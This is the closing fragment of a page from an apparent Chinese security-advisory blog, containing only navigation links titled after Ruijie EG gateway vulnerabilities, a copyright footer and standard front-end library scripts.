+    <div class="post-nav"><a href="/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="锐捷 EG易网关 phpinfo.view.php 信息泄露漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>锐捷 EG易网关 phpinfo.view.php 信息泄露漏洞</a>
+            <a href="/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="锐捷 EG易网关 cli.php 远程命令执行漏洞">锐捷 EG易网关 cli.php 远程命令执行漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
